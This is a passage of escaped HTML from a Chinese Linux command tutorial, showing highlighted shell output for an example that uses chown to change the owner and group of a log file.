class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-12&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-14&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-16&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9b513174287-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58b9b513174287-18&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0080 seconds] --&gt;

&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;实例2：改变文件拥有者和群组&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58b9f339007107&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
chown root: log2012.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58b9f339007107-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58b9f339007107-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0007 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;strong&gt;　　　　&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58ba3868384113&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll
总计 604
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 mail mail  302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log
[root@localhost test6]# chown root: log2012.log 
[root@localhost test6]# ll
总计 604
---xr--r-- 1 root users 302108 11-30 08:39 linklog.log
---xr--r-- 1 root root  302108 11-30 08:39 log2012.log
-rw-r--r-- 1 root users     61 11-30 08:39 log2013.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2014.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2015.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2016.log
-rw-r--r-- 1 root users      0 11-30 08:39 log2017.log
[root@localhost test6]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587abc0e58ba3868384113-20&quot;&gt;20&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-2&quot;&gt;总计&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-5&quot;&gt;
